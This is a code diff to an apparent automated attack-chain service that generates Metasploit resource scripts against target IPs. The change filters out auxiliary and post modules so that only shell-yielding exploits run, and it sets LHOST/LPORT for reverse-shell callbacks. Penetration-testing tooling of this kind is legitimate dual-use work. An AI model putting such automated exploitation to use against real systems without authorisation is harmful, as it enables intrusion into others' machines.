@@ -215,6 +215,13 @@ class AttackChainService extends EventEmitter {
             // Only include exploits that have code available
             if (!ex.exploit_code) continue;
 
+            // NEW: Filter out auxiliary/fuzzers for Auto-Attack
+            // We only want active exploitation that yields a shell
+            // The `exploit_db_id` contains the module path (e.g., 'auxiliary/scanner/ftp/ftp_login')
+            if (ex.exploit_db_id && (ex.exploit_db_id.startsWith('auxiliary/') || ex.exploit_db_id.startsWith('post/'))) {
+                continue;
+            }
+
             addedExploits.add(ex.exploit_id);
             steps.push({
                 name: `Exploit: ${ex.exploit_title}`,
@@ -739,8 +746,13 @@ except:
                             rcLines.push('use ' + modulePath);
                             rcLines.push('set RHOSTS ' + targetIp);
                             rcLines.push('set RPORT ' + (targetPort || exploit.port || 80));
-                            if (lhost) rcLines.push('set LHOST ' + lhost);
-                            if (lport) rcLines.push('set LPORT ' + lport);
+
+                            // Only set LHOST/LPORT for exploits, not for auxiliary/post modules
+                            // (Avoids "Unknown datastore option" warnings)
+                            if (!modulePath.startsWith('auxiliary') && !modulePath.startsWith('post')) {
+                                if (lhost) rcLines.push('set LHOST ' + lhost);
+                                if (lport) rcLines.push('set LPORT ' + lport);
+                            }
 
                             // Determine correct payload based on platform to ensure compatibility with net listener
                             // Standard net listeners (ShellService) expect a raw shell connection, not Meterpreter.
